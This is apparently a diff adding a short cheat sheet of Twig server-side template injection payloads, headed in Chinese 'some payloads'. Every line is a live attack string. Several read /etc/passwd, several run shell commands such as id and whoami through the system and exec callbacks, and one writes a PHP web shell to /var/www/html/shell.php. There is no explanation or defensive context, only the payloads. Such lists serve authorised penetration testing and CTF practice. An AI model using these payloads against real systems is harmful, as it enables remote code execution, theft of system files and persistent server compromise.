@@ -1,0 +1,22 @@
+一些payload
+{{'/etc/passwd'|file_excerpt(1,30)}}
+
+{{app.request.files.get(1).__construct('/etc/passwd','')}}
+
+{{app.request.files.get(1).openFile.fread(99)}}
+
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}
+
+{{_self.env.enableDebug()}}{{_self.env.isDebug()}}
+
+{{["id"]|map("system")|join(",")
+
+{{{"<?php phpinfo();":"/var/www/html/shell.php"}|map("file_put_contents")}}
+
+{{["id",0]|sort("system")|join(",")}}
+
+{{["id"]|filter("system")|join(",")}}
+
+{{[0,0]|reduce("system","id")|join(",")}}
+
+{{['cat /etc/passwd']|filter('system')}}
